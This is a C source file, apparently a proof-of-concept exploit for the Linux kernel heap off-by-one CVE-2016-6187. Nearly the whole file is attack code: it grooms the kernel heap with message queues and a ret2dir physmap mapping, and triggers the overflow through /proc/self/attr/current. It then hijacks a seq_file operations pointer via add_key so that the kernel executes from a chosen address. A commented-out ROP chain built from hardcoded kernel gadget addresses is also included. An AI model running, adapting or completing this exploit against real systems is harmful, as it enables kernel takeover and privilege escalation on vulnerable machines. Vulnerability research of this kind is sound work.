/**
 * Quick and dirty PoC for CVE-2016-6187 heap off-by-one PoC
 * By Vitaly Nikolenko
 * vnik@cyseclabs.com
 *
 * There's no privilege escalation payload but the kernel will execute
 * instructions from 0xdeadbeef.
 *
 * gcc matreshka.c -o matreshka -lpthread
 *
 * greetz to dmr and s1m0n
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <sched.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <string.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <linux/userfaultfd.h>
#include <stdlib.h>
#include <errno.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <strings.h>
#include <unistd.h>
#include <asm/unistd.h>
#include <poll.h>
#include <pthread.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdarg.h>
#include <keyutils.h>

// for ret2dir
#define PHYS_OFFSET 0xffff880000000000
#define PFN_MIN 0
#define PAGE_SIZE 0x1000
#define USER_ADDR 0x40000000
#define PAGE_SHIFT 12
#define CRASH_ADDR 0xffffffffdeadbeef

// for rop
#define PAYLOAD_ADDR 0x40002000
#define PAYLOAD_OFFSET (PAGE_SIZE - 0x50)

void setup_pagefault(void *, unsigned, uint8_t);

const int pagesize = 4096;

struct {
	long mtype;
	char mtext[80];
} msg;

struct thread_struct {
	int fd;
	uint8_t h_sw; // handler switch
	uint8_t count;
};

struct kernel_param {
	char hole1[0x10];
	void* ops;
	char hole2[0x8];
	void *arg;
};

struct kernel_param_ops {
	char hole1[0x10];
	uint64_t rdx;
	void* free;
};

struct subprocess_info {
	char hole1[0x28];
	char *path;
	char hole2[0x20];
	int (*cleanup)(void);
	void *data;
};

struct fetch_param {
	void* fn;
	char hole1[0x8];
};

struct deref_fetch_param {
    struct fetch_param orig;
    char hole1[0x18];
};

struct irqaction {
    void* handle;
    void* dev_id;
    char hole[0x70];
};

struct irq_desc {
    char hole1[0x68];
    struct irqaction* action;
    char hole2[0x110];
};

// original uart_port is too large
struct part_of_tg3 {
	char hole1[0x30];
	uint64_t rsi;
};

#pragma pack(1)
struct seq_file {
	char hole1[0x60-0x12];
	void* op;
	char hole2[0x18];
};

#pragma pack(1)
struct seq_operations {
	void* start;
	void* stop;
	void* next;
	int* show;
};

struct seq_file fake_seq_file;

// | ... | 0x10 | stack canary | saved register | rop |
// copy subprocess_info and stack canary at the same time
void* copy_subprocess_info(void* kaddr) {
	// embed first and second  kernel_param into subprocess_info
	struct subprocess_info* fake_subprocess_info = (struct subprocess_info*)USER_ADDR;
	struct kernel_param* fake_kernel_param1 = (struct kernel_param*)USER_ADDR;
	struct kernel_param* fake_kernel_param2 = (struct kernel_param*)(USER_ADDR + sizeof(struct kernel_param));

	void* fake_kernel_param_ops1_addr = (void*)(kaddr + 
			sizeof(struct kernel_param)*4);

	// use part_of_tg3 to control RSI
	void* fake_kernel_param_arg1 = (void*)(kaddr +
			sizeof(struct kernel_param)*4 +
			sizeof(struct kernel_param_ops)*4 + 
			sizeof(struct irq_desc) +
			sizeof(struct irqaction) + 
			sizeof(struct deref_fetch_param));

	void* fake_kernel_param_ops2_addr = ((void*)(kaddr + 
				sizeof(struct kernel_param)*4 +
				sizeof(struct kernel_param_ops)));
	// control RDI for copy_to_user's dest
	void* fake_kernel_param_arg2 = (void*)(USER_ADDR + 
			sizeof(struct kernel_param)*4 + 
			sizeof(struct kernel_param_ops)*4 +
			sizeof(struct irq_desc) + 
			sizeof(struct irqaction) +
			sizeof(struct deref_fetch_param) + 
			sizeof(struct part_of_tg3)); 

    void* paddr = (void*)(PAYLOAD_ADDR + PAYLOAD_OFFSET);
    // prepare payload
    // TODO

    // copy_to_user stack canary address
    uint64_t* canary_addr = (uint64_t*)(USER_ADDR +
            sizeof(struct kernel_param)*4 +
            sizeof(struct kernel_param_ops)*4 +
            sizeof(struct irq_desc) +
            sizeof(struct irqaction) +
            sizeof(struct deref_fetch_param) +
			sizeof(struct part_of_tg3) + 
            0xc);
    // copy_from_user stack canary address
    uint64_t* new_canary_addr = (uint64_t*)(paddr + 0x10);
    int i = 0;


	while(true) {
        *new_canary_addr =  *canary_addr;
		fake_subprocess_info->path = 0;
		// hijack to destroy_params
		//fake_subprocess_info->cleanup = (void*)0xffffffff8107b130;
		fake_subprocess_info->cleanup = (void*)CRASH_ADDR;

		fake_kernel_param1->ops = fake_kernel_param_ops1_addr;
		fake_kernel_param1->arg = fake_kernel_param_arg1;

		fake_kernel_param2->ops = fake_kernel_param_ops2_addr;
		fake_kernel_param2->arg = fake_kernel_param_arg2; 
	}
}

// sizeof(struct subprocess_info) = 0x60
// sizeof(struct kernel_param)*2 = 0x50
// p/x &((struct kernel_param*)0)->ops = 0x10
// subprocess_info + half kernel_param = kernel_param * 3  

// | subprocess_info | half kernel_param | kernel_param | kernel_param_ops * 4 | irq_desc | irqaction | deref_fetch_param | part_of_tg3
void construct_malicious_data(void* kaddr) {
	// subprocess_info and first two kernel_param are set in copy_subprocess_info

	memset(&fake_seq_file, 0, sizeof(struct seq_file));
	fake_seq_file.op = (void*)kaddr;

	struct seq_operations* fake_seq_operations = (struct seq_operations*)USER_ADDR;
	fake_seq_operations->start = (void*)CRASH_ADDR;
	return;
  /*
	struct kernel_param* fake_kernel_param3 = (struct kernel_param*)(USER_ADDR + sizeof(struct kernel_param)*2);
	
	fake_kernel_param3->ops = ((void*)(kaddr + 
				sizeof(struct kernel_param)*4 + 
				sizeof(struct kernel_param_ops)*2));

	// control RDX in ROP gadget
	fake_kernel_param3->arg = (void*)(kaddr + 
			sizeof(struct kernel_param)*4 +
			sizeof(struct kernel_param_ops)*2);
	
	// kernel_param 4
	struct kernel_param* fake_kernel_param4 = (struct kernel_param*)(USER_ADDR + sizeof(struct kernel_param)*3);
	fake_kernel_param4->ops = (void*)(kaddr + 
			sizeof(struct kernel_param)*4 + 
			sizeof(struct kernel_param_ops)*3);
	fake_kernel_param4->arg = (void*)(kaddr + 
			sizeof(struct kernel_param)*4 +
			sizeof(struct kernel_param_ops)*4);

	// fork1 to control RSI so as to assist fork2
	struct kernel_param_ops fake_kernel_param_ops1;
	fake_kernel_param_ops1.free = (void*)0xffffffff815e4bfb;
	memcpy((void*)(USER_ADDR +
				sizeof(struct kernel_param)*4),
			&fake_kernel_param_ops1, sizeof(struct kernel_param_ops));

	// fork2 to fetch_deref_string_size to 
	// 1. construct fake stack
	// 2. invoke indirect call to copy_to_user gadget in e1000_ioctl
	struct kernel_param_ops fake_kernel_param_ops2;
	fake_kernel_param_ops2.free = (void*)0xffffffff8111d910;
	memcpy((void*)(USER_ADDR +
				sizeof(struct kernel_param)*4 + 
				sizeof(struct kernel_param_ops)),
			&fake_kernel_param_ops2, sizeof(struct kernel_param_ops));

	// fork3 to rop in of_mbox_index_xlate to
	// 1. control RDX
	struct kernel_param_ops fake_kernel_param_ops3;
	fake_kernel_param_ops3.free = (void*)0xffffffff8171995a;
	fake_kernel_param_ops3.rdx = 0x70; // RDX reuse kernel_param_ops
	memcpy((void*)(USER_ADDR + 
				sizeof(struct kernel_param)*4 + 
				sizeof(struct kernel_param_ops)*2),
			&fake_kernel_param_ops3, sizeof(struct kernel_param_ops));

	// fork4 to __handle_irq_event_percpu to 
	// 1. first bloom RSI control 
	// 2. invoke indirect call to copy_from_user gadget in input_event_from_user
	struct kernel_param_ops fake_kernel_param_ops4;
	fake_kernel_param_ops4.free = (void*)0xffffffff810ac020;
	memcpy((void*)(USER_ADDR + 
				sizeof(struct kernel_param)*4 + 
				sizeof(struct kernel_param_ops)*3),
			&fake_kernel_param_ops4, sizeof(struct kernel_param_ops));

	// in __handle_irq_event_percpu
    struct irq_desc fake_irq_desc;
    fake_irq_desc.action = (void*)(kaddr +
			sizeof(struct kernel_param)*4 + 
            sizeof(struct kernel_param_ops)*4 +
            sizeof(struct irq_desc));
    memcpy((void*)(USER_ADDR +
				sizeof(struct subprocess_info) +
				sizeof(struct kernel_param)*2 - 0x10 +
                sizeof(struct kernel_param_ops)*4),
            &fake_irq_desc, sizeof(struct irq_desc));

    struct irqaction fake_irqaction;
    // invoke indirect call in input_event_from_user so as to copy_from_user
    fake_irqaction.handle = (void*)0xffffffff8169cb75;
    fake_irqaction.dev_id = (void*)(PAYLOAD_ADDR + PAYLOAD_OFFSET); // RSI
    memcpy((void*)(USER_ADDR +
				sizeof(struct kernel_param)*4 +
                sizeof(struct kernel_param_ops)*4 +
                sizeof(struct irq_desc)),
            &fake_irqaction, sizeof(struct irqaction));

    struct deref_fetch_param fake_deref_fetch_param;
    // invoke indirect call in e1000_ioctl so as to copy_to_user
    fake_deref_fetch_param.orig.fn = (void*)0xffffffff8162fbe0;
    memcpy((void*)(USER_ADDR +
				sizeof(struct kernel_param)*4 +
                sizeof(struct kernel_param_ops)*4 +
                sizeof(struct irq_desc) +
                sizeof(struct irqaction)),
            &fake_deref_fetch_param, sizeof(struct deref_fetch_param));

	struct part_of_tg3 fake_part_of_tg3;
	fake_part_of_tg3.rsi = (uint64_t)(kaddr +
			sizeof(struct kernel_param)*4 +
			sizeof(struct kernel_param_ops)*4 + 
			sizeof(struct irq_desc) + 
			sizeof(struct irqaction) - 0x6); // wait parameter of call_usermodehelper is 0x6
	memcpy((void*)(USER_ADDR +
				sizeof(struct kernel_param)*4 +
                sizeof(struct kernel_param_ops)*4 +
                sizeof(struct irq_desc) +
                sizeof(struct irqaction) + 
				sizeof(struct deref_fetch_param)),
			&fake_part_of_tg3, sizeof(struct part_of_tg3));

	return;
	*/
}

void setup_roppayload() {
    void* addr = (void*)PAYLOAD_ADDR;
    void* raddr = NULL;
    munmap(addr, PAGE_SIZE);
    raddr = mmap(addr, PAGE_SIZE, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, -1, 0);
    if(raddr == MAP_FAILED) {
        perror("mmap failed");
        pthread_exit(raddr);
    }
    memset(raddr, 'B', PAGE_SIZE);
}

void* setup_dir() {
    void* uaddr = (void*)USER_ADDR;
    void* raddr = NULL;
    void* ret = NULL;
    char file_name[30];
    sprintf(file_name, "/proc/%d/pagemap", getpid());
    int fd = open(file_name, O_RDONLY);
    if (fd < 0) {
        perror("open failed");
        goto err;
    }
    uint64_t v = 0;
    uint64_t pfn = 0;

    munmap(uaddr, PAGE_SIZE);
    raddr = mmap(uaddr, PAGE_SIZE, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, -1, 0);
    if(raddr == MAP_FAILED) {
        perror("mmap failed");
        goto err;
    }
    // necessary due to lazy allocation
    memset(raddr, 0, PAGE_SIZE);
    lseek(fd, ((uint64_t)uaddr >> PAGE_SHIFT)*sizeof(uint64_t), SEEK_SET);
    read(fd, &v, sizeof(uint64_t));
    if (v & (1UL << 63)) {
        pfn = v & ((1UL << 55) - 1);
        fprintf(stdout, "pfn: 0x%lx\n", pfn);
        uint64_t kaddr = 0;
        kaddr = PHYS_OFFSET + 0x1000 * (pfn-PFN_MIN);
        fprintf(stdout, "kaddr: 0x%lx\n", kaddr);
        ret = (void*)kaddr;
		construct_malicious_data((void*)kaddr);
    }
err:
    close(fd);
    return ret;
}

static bool write_file(const char* file, const char* what, ...)
{
    char buf[1024];
    va_list args;
    va_start(args, what);
    vsnprintf(buf, sizeof(buf), what, args);
    va_end(args);
    buf[sizeof(buf) - 1] = 0;
    int len = strlen(buf);

    int fd = open(file, O_WRONLY | O_CLOEXEC);
    if (fd == -1)
        return false;
    if (write(fd, buf, len) != len) {
        close(fd);
        return false;
    }
    close(fd);
    return true;
}

// void setup_sandbox() {
//     int real_uid = getuid();
//     int real_gid = getgid();
// 
//     if (unshare(CLONE_NEWUSER) != 0) {
//         perror("unshare(CLONE_NEWUSER)");
//         exit(EXIT_FAILURE);
//     }
// 
//     if (unshare(CLONE_NEWNET) != 0) {
//         perror("unshare(CLONE_NEWNET)");
//         exit(EXIT_FAILURE);
//     }
//     if (!write_file("/proc/self/setgroups", "deny")) {
//         perror("write_file(/proc/self/setgroups)");
//         exit(EXIT_FAILURE);
//     }
//     if (!write_file("/proc/self/uid_map", "0 %d 1\n", real_uid)){
//         perror("write_file(/proc/self/uid_map)");
//         exit(EXIT_FAILURE);
//     }
//     if (!write_file("/proc/self/gid_map", "0 %d 1\n", real_gid)) {
//         perror("write_file(/proc/self/gid_map)");
//         exit(EXIT_FAILURE);
//     }
// 
//     cpu_set_t my_set;
//     CPU_ZERO(&my_set);
//     CPU_SET(0, &my_set);
//     if (sched_setaffinity(0, sizeof(my_set), &my_set) != 0) {
//         perror("sched_setaffinity()");
//         exit(EXIT_FAILURE);
//     }
// 
//     if (system("/sbin/ifconfig lo up") != 0) {
//         perror("system(/sbin/ifconfig lo up)");
//         exit(EXIT_FAILURE);
//     }
// 
//     printf("[.] namespace sandbox setup successfully\n");
// }

void addkey2overwrite() {
	char type[5] = "user";
	char* description = (char*)malloc(sizeof(char)*4);
	memset(description, 'A', 4);
	char* payload = (char*)malloc(sizeof(char)*0x60);
	memcpy(payload, &fake_seq_file, 0x60);
	int i = 0;
	fprintf(stderr, "%lx\n", *(uint64_t*)(payload+0x60-0x12));
	key_serial_t key;
	key = add_key(type, description, payload, 0x60, KEY_SPEC_USER_KEYRING);
	if (key == -1){
		perror("add_key");
		exit(0);
	}
}

int main(int argc, char **argv) {
	//setup_sandbox();
	setup_roppayload();
	void* dir_addr = setup_dir();
	int  msqid;
	pthread_t th_arr[64];
	int i = 0;
//	for (i = 0 ; i < 64; i++)
//		pthread_create(&th_arr[i], NULL, copy_subprocess_info, dir_addr);
	sleep(1);


	printf("my pid = %d\n", getpid());

	uint64_t *p = (uint64_t *)msg.mtext;

	for (i = 0; i < 6; i++) {
		*p ++ = (uint64_t)dir_addr;
	}
	msg.mtype = 1;

	msqid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);

	// defragment
	for (i = 0; i < 159; i++) { // that's generally the limit
		if (msgsnd(msqid, &msg, 80, 0) == -1) {
			perror("msgsnd");
			return -1;
		}
	}

	char buf[128];
	p = (uint64_t *)buf;

	for (i = 0; i < 15; i++) {
		*p ++ = (uint64_t)dir_addr;
	}
	*p ++ = 0xfffffffffffffff;

	// trigger
	int fd = open("/proc/self/attr/current", O_RDWR);
	if (fd == -1)
		perror("trigger fd");
	write(fd, buf, 128);


	// msgsnd once to fill first slot
	msgsnd(msqid, &msg, 80, 0);
	// open proc file to allocate seq_file
	int seq_fd = open("/sys/kernel/debug/tracing/trace", O_RDONLY);
	if (seq_fd == -1)
		perror("seq_fd");
	// addkey to overwrite seq_file->op
	addkey2overwrite();
	char seq_buf[4];
	read(seq_fd, seq_buf, 4);
	close(fd);
	return 0;
}
